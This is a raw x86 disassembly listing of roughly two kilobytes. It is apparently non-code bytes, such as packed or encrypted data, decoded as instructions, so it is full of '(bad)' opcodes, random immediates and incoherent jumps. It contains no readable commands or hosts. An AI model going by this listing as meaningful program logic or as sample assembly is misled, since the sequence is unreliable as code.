  41ca61:	ins    DWORD PTR es:[edi],dx
  41ca62:	ins    BYTE PTR es:[edi],dx
  41ca63:	xor    BYTE PTR [ebx-0x76],0xf7
  41ca67:	and    eax,0xcb5c0bc2
  41ca6c:	cmp    bh,BYTE PTR [ebx-0x722c824d]
  41ca72:	sbb    eax,0x4a6c89fc
  41ca77:	cmc    
  41ca78:	mov    ds:0xc1bdd64b,al
  41ca7d:	or     cl,BYTE PTR [esi+0x27]
  41ca80:	mov    ds:0xa57a2c17,eax
  41ca85:	out    0xac,al
  41ca87:	pop    ss
  41ca88:	aad    0x35
  41ca8a:	xchg   ebx,eax
  41ca8b:	mov    ch,BYTE PTR [edx-0x4eadf04]
  41ca91:	in     al,dx
  41ca92:	push   ebx
  41ca93:	push   0x64
  41ca95:	xchg   edi,eax
  41ca96:	clc    
  41ca97:	adc    al,0x17
  41ca99:	test   eax,0xa46dc56a
  41ca9e:	into   
  41ca9f:	sahf   
  41caa0:	cwde   
  41caa1:	(bad)  
  41caa2:	repz sbb DWORD PTR [ecx-0x4fd255b0],esp
  41caa9:	das    
  41caaa:	loop   0x41cb06
  41caac:	add    ebp,DWORD PTR [edx]
  41caae:	xchg   ebp,eax
  41caaf:	mov    esi,0xcdbcfda0
  41cab4:	ins    BYTE PTR es:[edi],dx
  41cab5:	and    ebx,DWORD PTR [edi+0x612b29a]
  41cabb:	dec    eax
  41cabc:	jle    0x41caab
  41cabe:	lock pop ecx
  41cac0:	xchg   edx,eax
  41cac1:	cdq    
  41cac2:	(bad)  
  41cac3:	(bad)  
  41cac4:	cmp    ah,BYTE PTR [ecx]
  41cac6:	xchg   ebp,eax
  41cac7:	scas   al,BYTE PTR es:[edi]
  41cac8:	xchg   BYTE PTR [edx],dl
  41caca:	mov    esi,0x39383205
  41cacf:	xor    cl,al
  41cad1:	aam    0x4d
  41cad3:	cmovnp edx,ecx
  41cad6:	sahf   
  41cad7:	call   0x71f1:0xbfcca033
  41cade:	test   BYTE PTR [esi-0x58ee0f2d],dh
  41cae4:	sbb    al,0xb9
  41cae6:	mov    bh,BYTE PTR [eax]
  41cae8:	cmc    
  41cae9:	or     esi,DWORD PTR [eax-0x1a]
  41caec:	test   al,0x97
  41caee:	push   0x59aacf0f
  41caf3:	and    esp,edx
  41caf5:	inc    esi
  41caf6:	push   cs
  41caf7:	and    DWORD PTR [ecx],edx
  41caf9:	in     al,0x13
  41cafb:	dec    esi
  41cafc:	xor    DWORD PTR [ecx+0x34],ecx
  41caff:	outs   dx,DWORD PTR ds:[esi]
  41cb00:	ror    DWORD PTR [ebp-0x4cc1ea44],0x2e
  41cb07:	stc    
  41cb08:	ret    
  41cb09:	sub    DWORD PTR [ecx+0x13],0x25
  41cb0d:	out    dx,eax
  41cb0e:	sub    al,0x1f
  41cb10:	ins    BYTE PTR es:[edi],dx
  41cb11:	cmp    BYTE PTR [edi+0x10],cl
  41cb14:	mov    al,0x7
  41cb16:	xchg   esp,eax
  41cb17:	jecxz  0x41cb39
  41cb19:	mul    BYTE PTR [ebx]
  41cb1b:	fdivr  st(7),st
  41cb1d:	mov    WORD PTR [ebx+0x11],es
  41cb20:	adc    al,0x53
  41cb22:	cld    
  41cb23:	dec    eax
  41cb24:	ret    0xb4e9
  41cb27:	pushf  
  41cb28:	adc    BYTE PTR [esi+edx*8+0x4],0xb8
  41cb2d:	pop    ecx
  41cb2e:	nop
  41cb2f:	mov    cl,0x29
  41cb31:	xchg   ecx,eax
  41cb32:	sbb    al,0xbe
  41cb34:	adc    DWORD PTR [ebp+0x5133a679],edx
  41cb3a:	pop    ss
  41cb3b:	outs   dx,BYTE PTR ds:[esi]
  41cb3c:	xchg   DWORD PTR [ecx],edx
  41cb3e:	ficomp WORD PTR ds:0x35ba2d04
  41cb44:	lods   al,BYTE PTR ds:[esi]
  41cb45:	jmp    0xb21f:0x5673ca74
  41cb4c:	aad    0xc9
  41cb4e:	pop    ds
  41cb4f:	adc    esp,DWORD PTR [edx-0x6e]
  41cb52:	pxor   mm6,QWORD PTR [edx+edi*8]
  41cb56:	stc    
  41cb57:	ror    DWORD PTR [ecx],0x65
  41cb5a:	adc    dl,BYTE PTR [esi-0x16]
  41cb5d:	jne    0x41cb1f
  41cb5f:	xchg   ecx,eax
  41cb60:	jmp    DWORD PTR [edx]
  41cb62:	jnp    0x41cb68
  41cb64:	sbb    DWORD PTR [ebx-0x7a2ad571],0x4
  41cb6b:	dec    edx
  41cb6c:	adc    edi,DWORD PTR ds:0x38a2a191
  41cb72:	jne    0x41cbb1
  41cb74:	rol    DWORD PTR [ebx],0xf9
  41cb77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb78:	jmp    0x6776:0x762b72cf
  41cb7f:	retf   0x2011
  41cb82:	xor    edi,esi
  41cb84:	mov    dh,BYTE PTR [edx-0x49]
  41cb87:	dec    esi
  41cb88:	(bad)
  41cb8b:	(bad)  
  41cb8c:	sbb    al,0x20
  41cb8e:	jecxz  0x41cbf6
  41cb90:	stos   DWORD PTR es:[edi],eax
  41cb91:	leave  
  41cb92:	adc    DWORD PTR [eax],ebx
  41cb94:	push   ebx
  41cb95:	or     ah,BYTE PTR [edi-0x5b]
  41cb98:	js     0x41cbae
  41cb9a:	out    0x2e,eax
  41cb9c:	xchg   ecx,eax
  41cb9d:	xchg   ebx,eax
  41cb9e:	push   eax
  41cb9f:	stos   DWORD PTR es:[edi],eax
  41cba0:	outs   dx,BYTE PTR ds:[esi]
  41cba1:	mov    ds,WORD PTR [esi-0x556b0a79]
  41cba7:	(bad)  [ebp+0x48]
  41cbaa:	pop    esp
  41cbab:	daa    
  41cbac:	push   edi
  41cbad:	mov    esp,0x80428747
  41cbb2:	ret    0xdd03
  41cbb5:	(bad)  
  41cbb6:	adc    eax,0x1fdecbed
  41cbbb:	inc    ch
  41cbbd:	stos   DWORD PTR es:[edi],eax
  41cbbe:	adc    BYTE PTR [ebx+0x2d596dc4],ch
  41cbc4:	bound  edi,QWORD PTR [eax+ebp*8-0x366834e8]
  41cbcb:	cmp    al,0xa9
  41cbcd:	and    DWORD PTR [edi-0x2b],ebx
  41cbd0:	scas   al,BYTE PTR es:[edi]
  41cbd1:	mov    bh,0xa1
  41cbd3:	mov    ebx,0xffd38d1b
  41cbd8:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41cbda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbdb:	lock inc ebp
  41cbdd:	mov    esp,DWORD PTR [ecx-0x76]
  41cbe0:	jb     0x41cb9d
  41cbe2:	scas   eax,DWORD PTR es:[edi]
  41cbe3:	and    DWORD PTR [ecx*2+0x6a8f603b],ebp
  41cbea:	mov    eax,ds:0x50a72dd
  41cbef:	push   cs
  41cbf0:	add    eax,0x26759578
  41cbf5:	lds    edx,FWORD PTR [edx+0x73]
  41cbf8:	ror    cl,0xd0
  41cbfb:	sahf   
  41cbfc:	jl     0x41cc05
  41cbfe:	push   edi
  41cbff:	dec    eax
  41cc00:	mov    ds:0x9ad63853,al
  41cc05:	scas   al,BYTE PTR es:[edi]
  41cc06:	not    edi
  41cc08:	pop    edi
  41cc09:	fwait
  41cc0a:	jecxz  0x41cbc8
  41cc0c:	(bad)  
  41cc0d:	aas    
  41cc0e:	push   ebx
  41cc0f:	and    edi,ecx
  41cc11:	and    bl,bl
  41cc13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc14:	cdq    
  41cc15:	data16 or ch,BYTE PTR [ebx+eiz*8+0x3ccd892c]
  41cc1d:	push   ecx
  41cc1e:	retf   
  41cc1f:	pop    ss
  41cc20:	jns    0x41cc27
  41cc22:	pop    edi
  41cc23:	xchg   dh,bl
  41cc25:	or     BYTE PTR [esi],ah
  41cc27:	lods   al,BYTE PTR ds:[esi]
  41cc28:	arpl   WORD PTR [edx+0x73170b60],sp
  41cc2e:	mov    edi,DWORD PTR [ebx]
  41cc30:	inc    edx
  41cc31:	or     esi,DWORD PTR [ebx]
  41cc33:	pusha  
  41cc34:	mov    BYTE PTR [edx-0x3cc327a5],ah
  41cc3a:	call   0x64ae:0xa9fb1c1a
  41cc41:	ret    
  41cc42:	sub    al,0xc9
  41cc44:	pop    ss
  41cc45:	mov    esp,DWORD PTR [ebp+eax*4-0x6286fba8]
  41cc4c:	mov    eax,0x5ee4c3e3
  41cc51:	sub    al,0xe2
  41cc53:	lock jns 0x41cc70
  41cc56:	cmp    ebp,DWORD PTR [edi+0x46e8449]
  41cc5c:	mov    cs,WORD PTR [ebx]
  41cc5e:	iret   
  41cc5f:	arpl   WORD PTR [esi],sp
  41cc61:	mov    ch,al
  41cc63:	icebp  
  41cc64:	retf   
  41cc65:	add    eax,DWORD PTR [ebx]
  41cc67:	push   0xffffffc3
  41cc69:	inc    ebp
  41cc6a:	jo     0x41cc10
  41cc6c:	jnp    0x41cbfb
  41cc6e:	mov    dh,0x96
  41cc70:	mov    ebx,0xfa30cd5c
  41cc75:	gs into 
  41cc77:	sbb    eax,0x2f78a72a
  41cc7c:	pop    eax
  41cc7d:	push   ss
  41cc7e:	mov    ds:0xb4a6f195,al
  41cc83:	mov    dl,0x7e
  41cc85:	pop    esi
  41cc86:	mov    bl,0x1e
  41cc88:	data16 sub ch,dh
  41cc8b:	lea    esp,[ecx]
  41cc8d:	fdivr  DWORD PTR [eax+0x1eadc57e]
  41cc93:	sbb    ebx,DWORD PTR [ebx]
	...
  41cd11:	add    BYTE PTR [eax],al
  41cd13:	add    al,ch
  41cd15:	shl    BYTE PTR [edi+0x76],1
  41cd18:	jg     0x41cd11
  41cd1a:	stc    
  41cd1b:	ficom  WORD PTR [ebp+0x2e]
  41cd1e:	inc    esp
  41cd1f:	and    al,0x31
  41cd21:	cdq    
  41cd22:	and    al,0x7c
  41cd25:	imul   eax,DWORD PTR [ecx],0x76900
  41cd2b:	add    BYTE PTR [esi+eiz*8-0xfcf8ddd],bh
  41cd32:	les    ebx,FWORD PTR [edx-0x27]
  41cd35:	lods   eax,DWORD PTR ds:[esi]
  41cd36:	mov    WORD PTR [eax-0x43],ds
  41cd39:	mov    ebp,0xdcd5ba55
  41cd3e:	xchg   esp,eax
  41cd3f:	jbe    0x41cd00
  41cd41:	loop   0x41cd1f
  41cd43:	push   0x79
  41cd45:	imul   edx,DWORD PTR [esi-0x3c558572],0xbc40516e
  41cd4f:	outs   dx,BYTE PTR ds:[esi]
  41cd50:	lahf   
  41cd51:	pop    ecx
  41cd52:	rcl    DWORD PTR [ecx],1
  41cd54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd55:	mov    bh,0x92
  41cd57:	push   0x49ffeae9
  41cd5c:	addr16 sbb edi,esp
  41cd5f:	mov    WORD PTR [ecx+0x23],?
  41cd62:	push   ebx
  41cd63:	mov    ds:0xa679402e,eax
  41cd68:	hlt    
  41cd69:	xchg   esi,eax
  41cd6a:	xor    edx,DWORD PTR [eax+0x2c989aa1]
  41cd70:	xchg   BYTE PTR [eax+0x7fc91a49],cl
  41cd76:	and    BYTE PTR [eax-0x42be01fd],bh
  41cd7c:	repz icebp 
  41cd7e:	push   ds
  41cd7f:	repz loop 0x41cdfd
  41cd82:	ins    BYTE PTR es:[edi],dx
  41cd83:	xor    DWORD PTR [edi],0x86017dd4
  41cd89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd8a:	push   0x7641acd3
  41cd8f:	gs mov esp,esi
  41cd92:	js     0x41cd23
  41cd94:	cmp    DWORD PTR [ecx],ebp
  41cd96:	mov    dl,0xc6
  41cd98:	(bad)  
  41cd99:	or     al,0xcd
  41cd9b:	pop    ebp
  41cd9c:	adc    dl,BYTE PTR [ebp+0x2099cedc]
  41cda2:	test   al,0x31
  41cda4:	and    BYTE PTR [ebp+0x22],bh
  41cda7:	scas   eax,DWORD PTR es:[edi]
  41cda8:	sahf   
  41cda9:	or     dh,dh
  41cdab:	out    dx,al
  41cdac:	pop    es
  41cdad:	cdq    
  41cdae:	inc    edx
  41cdaf:	int3   
  41cdb0:	lea    esp,[edi]
  41cdb2:	cs sahf 
  41cdb4:	test   DWORD PTR [ebp+0x59],0xddc987e1
  41cdbb:	mov    cl,BYTE PTR ds:0x6028fd3e
  41cdc1:	xchg   ebx,eax
  41cdc2:	xor    ebx,ecx
  41cdc4:	adc    eax,DWORD PTR [ebx+0x6c]
  41cdc7:	lea    ebx,[esi]
  41cdc9:	rol    BYTE PTR ss:[esi+0x64e3eb28],1
  41cdd0:	cs pop esi
  41cdd2:	push   ebx
  41cdd3:	pop    ebx
  41cdd4:	or     eax,0xcce5433c
  41cdd9:	aam    0x1d
  41cddb:	retf   
  41cddc:	rcl    DWORD PTR [edi],0x2e
  41cddf:	lahf   
  41cde0:	aaa    
  41cde1:	loop   0x41cddf
  41cde3:	nop
  41cde4:	popw   es
  41cde6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cde7:	push   ss
  41cde8:	cwde   
  41cde9:	xor    DWORD PTR [eax-0x1610f6c9],ebp
  41cdef:	dec    eax
  41cdf0:	cld    
  41cdf1:	aad    0x5a
  41cdf3:	mov    dl,0x2d
  41cdf5:	out    dx,al
  41cdf6:	inc    ebx
  41cdf7:	mov    ah,0xc1
  41cdf9:	dec    edi
  41cdfa:	dec    esi
  41cdfb:	inc    ecx
  41cdfc:	adc    al,0xb8
  41cdfe:	pop    es
  41cdff:	stc    
  41ce00:	dec    ecx
  41ce01:	mov    al,ds:0xb4bbd0f3
  41ce06:	pop    ss
  41ce07:	xchg   esp,eax
  41ce08:	cwde   
  41ce09:	daa    
  41ce0a:	push   0xaf31c7f
  41ce0f:	sbb    eax,0x6c630092
  41ce14:	mov    ebp,0xfc61da69
  41ce19:	lea    ecx,[ecx+0x41d7104f]
  41ce1f:	push   cs
  41ce20:	xchg   ecx,eax
  41ce21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce22:	ja     0x41ce96
  41ce24:	mov    ch,0xb7
  41ce26:	das    
  41ce27:	xchg   ebp,eax
  41ce28:	add    DWORD PTR [edx],0x9b5fe29c
  41ce2e:	add    DWORD PTR [edi+ebx*1-0x32813a1c],0x75bb9671
  41ce39:	cs leave 
  41ce3b:	pop    esp
  41ce3c:	stc    
  41ce3d:	call   0xfba4:0xaec305d9
  41ce44:	push   ss
  41ce45:	inc    edx
  41ce46:	jbe    0x41ce0d
  41ce48:	mov    ebp,0x35e9d88d
  41ce4d:	dec    esi
  41ce4e:	out    0x56,al
  41ce50:	bound  esi,QWORD PTR [ecx]
  41ce52:	xor    eax,0x7fe02757
  41ce57:	or     eax,0xd451a821
  41ce5c:	mov    eax,0x4537be3e
  41ce61:	jp     0x41ce3e
  41ce63:	scas   al,BYTE PTR es:[edi]
  41ce64:	and    al,0xfb
  41ce67:	sbb    al,0xb7
  41ce69:	push   eax
  41ce6a:	lods   eax,DWORD PTR ds:[esi]
  41ce6b:	out    dx,al
  41ce6c:	adc    BYTE PTR [eax+0x7f22bee4],ch
  41ce72:	mov    ebp,0x8b59d47
  41ce77:	sbb    al,0xab
  41ce79:	mov    ds:0x4e122d36,eax
  41ce7e:	mov    fs,WORD PTR [esi+0x20d08621]
  41ce84:	leave  
  41ce85:	jns    0x41ceb8
  41ce87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce88:	mov    cs,WORD PTR [ebx+0x3f6d639]
  41ce8e:	lahf   
  41ce8f:	out    dx,eax
  41ce90:	inc    ecx
  41ce91:	jo     0x41ce86
  41ce93:	xor    dh,BYTE PTR [edi-0xdecc4a2]
  41ce99:	push   esi
  41ce9a:	test   DWORD PTR [ebx],0x5eb2f27c
  41cea0:	ret    0xf956
  41cea3:	imul   ebp,DWORD PTR [ebx-0x180634c5],0xffffffba
  41ceaa:	xor    ebp,0x45ee7b7c
  41ceb0:	je     0x41ce79
  41ceb2:	xchg   esp,eax
  41ceb3:	rcl    DWORD PTR [ebp-0x3020fc5a],1
  41ceb9:	mov    eax,0xc3eec30f
  41cebe:	sbb    eax,0xdb8d105e
  41cec3:	and    DWORD PTR [edx+ecx*1+0x2c],ecx
  41cec7:	into   
  41cec8:	nop
  41cec9:	outs   dx,BYTE PTR ds:[esi]
  41ceca:	add    esp,ebx
  41cecc:	out    0x7,eax
  41cece:	stos   DWORD PTR es:[edi],eax
  41cecf:	push   ebx
  41ced0:	pop    ss
  41ced1:	xchg   edx,eax
  41ced2:	pop    esi
  41ced3:	sub    DWORD PTR [esi],0x22
  41ced6:	add    BYTE PTR [edi-0x59],0x61
  41ceda:	(bad)  
  41cedc:	out    dx,al
  41cedd:	and    al,0x68
  41cedf:	pusha  
  41cee0:	push   0x40
  41cee2:	sub    eax,0xe8e12a59
  41cee7:	mov    edx,0xa664d656
  41ceec:	mov    ah,0x15
  41ceee:	fsubp  st(3),st
  41cef0:	ins    DWORD PTR es:[edi],dx
  41cef1:	std    
  41cef2:	data16 fst DWORD PTR [edx+0xfc936a2]
  41cef9:	dec    esi
  41cefa:	hlt    
  41cefb:	sbb    eax,0x81d797c8
  41cf00:	ins    DWORD PTR es:[edi],dx
  41cf01:	inc    esp
  41cf02:	aad    0xd9
  41cf04:	cs dec eax
  41cf06:	(bad)  
  41cf07:	add    DWORD PTR cs:[bp+si-0x53],0x62
  41cf0d:	out    dx,eax
  41cf0e:	mov    eax,ds:0xccc756b4
  41cf13:	pop    ds
  41cf14:	rcr    cl,cl
  41cf16:	mov    eax,0xf4eb1c6f
  41cf1b:	frstor fs:[esi-0x772b88b8]
  41cf22:	je     0x41cf4f
  41cf24:	mov    ah,0x71
  41cf26:	(bad)
  41cf29:	xlat   BYTE PTR ds:[ebx]
  41cf2a:	pop    ecx
  41cf2b:	mov    dh,0xcd
  41cf2d:	js     0x41cef9
  41cf2f:	xchg   ecx,eax
  41cf31:	xchg   ecx,eax
  41cf32:	test   BYTE PTR [ecx-0x3d],cl
  41cf35:	aad    0x9
  41cf37:	fwait
  41cf38:	push   edx
  41cf39:	rcl    DWORD PTR [eax+0xb432fce],1
  41cf3f:	mov    esi,0xd91bc33c
  41cf44:	jle    0x41cf7c
  41cf46:	mov    cl,BYTE PTR [ebp+0x1b]
  41cf49:	dec    ax
  41cf4b:	or     al,0x96
  41cf4d:	ror    ebx,0x45
  41cf50:	fadd   st(6),st
  41cf52:	js     0x41cefa
  41cf54:	fbld   TBYTE PTR [eax+0x3ee70e79]
  41cf5a:	sub    eax,0xe292fa9a
  41cf5f:	add    al,0x71
  41cf61:	enter  0x6b46,0x78
  41cf65:	push   ds
  41cf66:	ret    0x460
  41cf69:	fld    QWORD PTR [ecx-0x6c]
  41cf6c:	ss repz leave 
  41cf6f:	or     DWORD PTR [ecx+0x79],0x1a298f92
  41cf76:	mov    bh,0xcb
  41cf78:	push   es
  41cf79:	mov    al,0x42
  41cf7b:	or     al,0xdf
  41cf7d:	mov    ebx,esi
  41cf7f:	mov    DWORD PTR [edi+ebp*2+0x22607a65],edi
  41cf86:	shr    DWORD PTR [edx-0x1e],0xda
  41cf8a:	ret    
  41cf8b:	cmp    al,0xb7
  41cf8d:	mov    esi,0x49c29a8d
  41cf92:	stos   DWORD PTR es:[edi],eax
  41cf93:	pop    edi
  41cf94:	into   
  41cf95:	outs   dx,DWORD PTR ds:[esi]
  41cf96:	push   esi
  41cf97:	pop    ss
  41cf98:	mov    dh,0x96
  41cf9a:	(bad)  
  41cf9b:	aas    
  41cf9c:	ss addr16 (bad) 
  41cf9f:	leave  
  41cfa0:	aas    
  41cfa1:	mov    ebp,0x951ad8f3
  41cfa6:	(bad)  
  41cfa7:	and    eax,0x1e2a06c1
  41cfac:	xor    al,0x78
  41cfae:	mov    ?,WORD PTR [edx+0x1aa2856d]
  41cfb4:	mov    esi,0x2670a48d
  41cfb9:	push   esi
  41cfba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfbb:	sbb    eax,0xd2b20cc2
  41cfc0:	addr16 push 0xffffffc3
  41cfc3:	lea    ebx,[ebx+ebx*8-0x58715475]
  41cfca:	and    DWORD PTR [esi+0x4e],0xffffffae
  41cfce:	push   ebx
  41cfcf:	addr16 enter 0x90dc,0xb9
  41cfd4:	cmp    eax,0x60dc8cdb
  41cfd9:	repnz fstp DWORD PTR [edi-0x51]
  41cfdd:	dec    ecx
  41cfde:	mov    bl,0xd5
  41cfe0:	and    eax,0x242df73f
  41cfe5:	jecxz  0x41d053
  41cfe7:	xchg   edi,eax
  41cfe8:	xor    al,0x8a
  41cfea:	dec    edx
  41cfeb:	mov    eax,ds:0x3067775d
  41cff0:	outs   dx,DWORD PTR gs:[esi]
  41cff2:	or     ch,dl
  41cff4:	mov    esi,0x79d64127
  41cff9:	push   cs
  41cffa:	xchg   BYTE PTR [eax+0x79],ch
  41cffd:	adc    bl,BYTE PTR [ebx]
  41cfff:	(bad)  
  41d000:	fadd   st(0),st
  41d002:	and    bl,BYTE PTR [esi-0x53]
  41d005:	int    0x30
  41d007:	cmp    eax,0xc7d1b8bb
  41d00c:	cwde   
  41d00d:	arpl   WORD PTR es:[edx],sp
  41d010:	mov    al,0x23
  41d012:	push   0xfffffff1
  41d014:	push   edx
  41d015:	dec    ebp
  41d016:	imul   eax,ecx,0x782783bf
  41d01c:	popa   
  41d01d:	aam    0xaa
  41d01f:	ja     0x41cfb1
  41d021:	sti    
  41d022:	std    
  41d023:	loopne 0x41cfbb
  41d025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d026:	ret    0xabc9
  41d029:	cmp    BYTE PTR [edx-0x2c587c94],bh
  41d02f:	fistp  WORD PTR [esi]
  41d031:	dec    esi
  41d032:	ins    DWORD PTR es:[edi],dx
  41d033:	imul   edx,DWORD PTR [edi+edx*1],0x62d824ea
  41d03a:	push   cs
  41d03b:	pop    esp
  41d03c:	xchg   ebp,eax
  41d03d:	or     al,0x26
  41d03f:	loop   0x41d064
  41d041:	retf   
  41d042:	xchg   ecx,eax
  41d043:	cmp    esi,DWORD PTR [eax+0xd659a9a]
  41d049:	(bad)  
  41d04a:	(bad)  
  41d04b:	cli    
  41d04c:	or     eax,0xaea1958
  41d051:	push   edi
  41d052:	sub    eax,0xe5c11ca4
  41d057:	repnz (bad) 
  41d059:	adc    BYTE PTR [ebx],ch
  41d05b:	sbb    DWORD PTR [ecx],0xffffff85
  41d05e:	mov    DWORD PTR [edx+0x3a],eax
  41d061:	pop    ebp
  41d062:	push   edi
  41d063:	inc    ebx
  41d064:	std    
  41d065:	and    eax,0x6e6c419d
  41d06a:	sub    al,0x95
  41d06c:	sub    DWORD PTR [edx+0x383757cc],0xdab1b503
  41d076:	add    edi,DWORD PTR [ecx-0x5f]
  41d079:	or     BYTE PTR [ebx+0x6dbab3ae],ch
  41d07f:	add    eax,0xa5e429c
  41d084:	pop    es
  41d085:	pop    DWORD PTR [edi-0x3b]
  41d088:	rol    ebp,0x99
  41d08b:	mov    edi,0x7790fa67
  41d090:	add    BYTE PTR [eax+0x58daad46],0x41
  41d097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d098:	sbb    BYTE PTR [edi-0x29feaaf2],bh
  41d09e:	out    0x9a,al
  41d0a0:	test   eax,0x8e542548
  41d0a5:	enter  0xe0d7,0xcd
  41d0a9:	(bad)  
  41d0aa:	jg     0x41d0f8
  41d0ac:	(bad)  
  41d0ad:	in     al,dx
  41d0ae:	aam    0x36
  41d0b0:	test   al,cl
  41d0b2:	pop    ebp
  41d0b3:	mov    bl,0x9c
  41d0b5:	mov    ebx,0x9a0068fc
  41d0ba:	aaa    
  41d0bb:	mov    al,0x47
  41d0bd:	jmp    0xc29c7535
  41d0c2:	xor    DWORD PTR [ecx+0x4bdcb539],esp
  41d0c8:	xchg   esi,eax
  41d0c9:	aas    
  41d0ca:	dec    esp
  41d0cb:	jge    0x41d138
  41d0cd:	and    al,BYTE PTR [ebx-0x5bd58257]
  41d0d3:	mov    esi,DWORD PTR [edx]
  41d0d5:	jo     0x41d099
  41d0d7:	mov    ch,0x19
  41d0d9:	aaa    
  41d0da:	loop   0x41d148
  41d0dc:	jns    0x41d0aa
  41d0de:	push   cs
  41d0df:	sub    al,0x89
  41d0e1:	ins    BYTE PTR es:[edi],dx
  41d0e2:	dec    edi
  41d0e3:	xchg   esi,eax
  41d0e4:	adc    BYTE PTR [edi-0x6a85f2de],0x24
  41d0eb:	shl    ah,1
  41d0ed:	clc    
  41d0ee:	test   al,0x3
  41d0f0:	sbb    eax,0x564e5eae
  41d0f5:	fs cmc 
  41d0f7:	xor    al,BYTE PTR [eax+0x30b35e20]
  41d0fd:	push   ecx
  41d0fe:	mov    ebp,0xbabd7aa0
  41d103:	xor    cl,BYTE PTR [edi+0x2d]
  41d106:	add    dl,dl
  41d108:	stos   BYTE PTR es:[edi],al
  41d109:	fadd   DWORD PTR [edi+0x27]
  41d10c:	inc    edi
  41d10d:	test   al,0x1f
  41d10f:	xor    al,0x53
  41d111:	shl    BYTE PTR [edx+0x61],cl
  41d114:	shl    DWORD PTR ds:0x695b179b,1
  41d11a:	arpl   WORD PTR [edx+0x255e400d],bp
  41d120:	sbb    cl,BYTE PTR [esi+eiz*2+0x72773593]
  41d127:	xor    eax,0xe9a51f91
  41d12c:	hlt    
  41d12d:	enter  0xf947,0xd6
  41d131:	adc    edi,edx
  41d133:	retf   0x3b28
  41d136:	inc    esp
  41d137:	mov    esp,0xfd5ddf3
  41d13c:	pop    es
  41d13d:	dec    edi
  41d13e:	mov    BYTE PTR [eax+ecx*8+0x43],ah
  41d142:	popf   
  41d143:	jecxz  0x41d10d
  41d145:	mov    dl,0xf3
  41d147:	sub    ebx,DWORD PTR [edx]
  41d149:	or     eax,0xca068f5b
  41d14e:	adc    dl,BYTE PTR [esi*1+0x20d6ffd6]
  41d155:	sti    
  41d156:	cmp    dh,BYTE PTR [ecx+0x20]
  41d159:	inc    eax
  41d15a:	out    dx,al
  41d15b:	or     BYTE PTR [ecx-0xc750eca],dh
  41d161:	enter  0x1cd9,0x99
  41d165:	sub    BYTE PTR [ebx],bl
  41d167:	and    eax,0x4500be8a
  41d16c:	popa   
  41d16d:	dec    ebx
  41d16e:	ret    
  41d16f:	mov    BYTE PTR [edx+0x2edc8985],dh
  41d175:	jne    0x41d138
  41d177:	adc    esi,DWORD PTR [esi+0x5430f11]
  41d17d:	xor    eax,0x9b3ce620
  41d182:	adc    bh,ah
  41d184:	pop    ss
  41d185:	in     eax,0xc3
  41d187:	jnp    0x41d15e
  41d189:	nop
  41d18a:	jb     0x41d1c3
  41d18c:	and    DWORD PTR [esi+0x22],eax
  41d18f:	add    al,0xfa
  41d191:	jmp    0x41d1aa
  41d193:	imul   ebp,DWORD PTR [ecx],0x4
  41d196:	rcl    DWORD PTR cs:[edx],cl
  41d199:	dec    esp
  41d19a:	and    al,BYTE PTR [eax-0x399e2182]
  41d1a0:	in     eax,dx
  41d1a1:	stc    
  41d1a2:	std    
  41d1a3:	pop    ecx
  41d1a4:	sub    ecx,DWORD PTR [edx+0x8]
  41d1a7:	push   es
  41d1a8:	cwde   
  41d1a9:	and    DWORD PTR [ecx],ebp
  41d1ab:	or     DWORD PTR [ecx+0x52],edi
  41d1ae:	inc    esi
  41d1af:	jbe    0x41d18b
  41d1b1:	aas    
  41d1b2:	xchg   esp,eax
  41d1b3:	mov    dh,0x94
  41d1b5:	adc    eax,0x7aaa998b
  41d1ba:	sbb    DWORD PTR [edi],0xa3f54ce6
  41d1c0:	nop
  41d1c1:	ins    DWORD PTR es:[edi],dx
  41d1c2:	inc    edi
  41d1c3:	jmp    0x41d1d9
  41d1c5:	mov    ebp,esi
  41d1c7:	and    DWORD PTR [eax-0x3419ed86],0xe6ee607a
  41d1d1:	in     eax,0xe8
  41d1d3:	cmp    ebx,DWORD PTR [esp+ecx*1+0x35a70202]
  41d1da:	adc    ecx,DWORD PTR [ebp+0x2a]
  41d1dd:	pushf  
  41d1de:	add    al,0x90
  41d1e0:	aam    0xd2
  41d1e2:	push   edi
  41d1e3:	test   eax,0x5d468235
  41d1e8:	sbb    ch,BYTE PTR [eax-0x41b0636a]
  41d1ee:	outs   dx,BYTE PTR ds:[esi]
  41d1ef:	in     al,0xeb
  41d1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1f2:	dec    DWORD PTR [ecx-0x6635e1dd]
  41d1f8:	or     eax,0x2148e6d8
  41d1fd:	fistp  QWORD PTR [edx-0x20]
  41d200:	pop    ebp
  41d201:	mov    cl,0x72
  41d203:	out    0x81,al
  41d205:	in     eax,dx
  41d206:	xchg   edi,eax
  41d207:	in     eax,0xf5
  41d209:	retf   0x8c36
  41d20c:	or     DWORD PTR [eax+eiz*2-0xc93e9f8],esi
  41d213:	cmp    BYTE PTR [edi-0x7a],bh
  41d216:	mov    ebp,0x48679933
  41d21b:	adc    cl,bh
  41d21d:	ds adc eax,0x5454f46b
  41d223:	mov    esp,0xb0085f64
  41d228:	scas   eax,DWORD PTR es:[edi]
  41d229:	mov    bl,0x72
  41d22b:	or     al,0xe7
  41d22d:	fucom  st(4)
  41d22f:	mov    esi,0x159d5c22
  41d234:	ret    0x6128
  41d237:	inc    ebp
  41d238:	adc    DWORD PTR [esi-0x43],ebp
  41d23b:	and    BYTE PTR [eax],dh
  41d23d:	mov    ebx,0x4e23d503
  41d242:	mov    ds:0xfbdd6165,al
  41d247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d248:	cwde   
  41d249:	push   ebx
  41d24a:	mov    edx,0x39cab8a0
  41d24f:	retf   
  41d250:	push   ss
  41d251:	stc    
  41d252:	xor    esp,ecx
  41d254:	rol    BYTE PTR [edi],cl
  41d256:	jmp    ecx
  41d258:	shr    dl,1
